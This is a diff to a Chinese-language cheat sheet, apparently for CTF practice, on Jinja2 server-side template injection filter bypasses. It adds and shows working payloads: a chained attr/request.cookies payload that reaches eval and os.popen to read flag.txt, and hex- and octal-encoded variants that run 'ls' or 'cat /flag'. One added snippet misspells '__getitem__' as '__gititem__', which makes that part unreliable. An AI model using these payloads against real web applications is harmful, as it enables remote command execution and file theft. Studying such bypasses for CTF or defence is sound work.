@@ -89,6 +89,28 @@ class 返回 str 类，str的基类是 object类，之后返回object的子类�
 
 很多 Python 中的语法在 SSTI 中也都是可以用的
 
+attr 用于获取变量，以下写法是相同的
+
+```
+""|attr("__class__")
+"".__class__
+```
+
+获取数组参数可以使用
+
+```
+__gititem__()
+__gititem__(数组下标)
+__gititem__("key")
+```
+
+绕过双引号可以使用
+
+ ```
+request.cookies.参数名
+request.args.参数名
+ ```
+
 比如通过 + 进行拼接绕过关键字，也可以使用 “” 进行拼接，或者 `"str1".__add__("str2")` 的方式
 
 ```
@@ -97,7 +119,7 @@ class 返回 str 类，str的基类是 object类，之后返回object的子类�
 {{app.__init__.__globals__["__buil".__add__("tins__")].open("/fla".__add__("g")).read()}}
 ```
 
-通过模板解析绕过 . 和 _
+通过十六进制绕过 . 和 _
 
 ```
 {{''["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fmro\x5f\x5f"][1]["\x5f\x5fsubclasses\x5f\x5f"]()[342]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]('os')["popen"]("ls")["read"]()}}
@@ -125,6 +147,13 @@ getattr(getattr(getattr(getattr(getattr(getattr(getattr([],'__cla'+'ss__'),'__mr
 
 ```
 {%print%0a(lipsum|attr("\137\137\147\154\157\142\141\154\163\137\137"))|attr("\137\137\147\145\164\151\164\145\155\137\137")("\137\137\142\165\151\154\164\151\156\163\137\137")|attr("\137\137\147\145\164\151\164\145\155\137\137")("\145\166\141\154")("\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\160\157\160\145\156\50\47\143\141\164\40\57\146\154\141\147\47\51\56\162\145\141\144\50\51")%}
+```
+
+利用 attr 和 request 绕过
+
+```
+{{()|attr(request.cookies.x1)|attr(request.cookies.x2)|attr(request.cookies.x3)()|attr(request.cookies.x4)(78)|attr(request.cookies.x5)|attr(request.cookies.x6)|attr(request.cookies.x4)(request.cookies.x7)|attr(request.cookies.x4)(request.cookies.x9)(request.cookies.x10)}}
+Cookie: x1=__class__; x2=__base__; x3=__subclasses__; x4=__getitem__; x5=__init__; x6=__globals__; x7=__builtins__; x8=__getitem__; x9=eval; x10=__import__("os").popen("cat flag.txt").read();
 ```
 
 
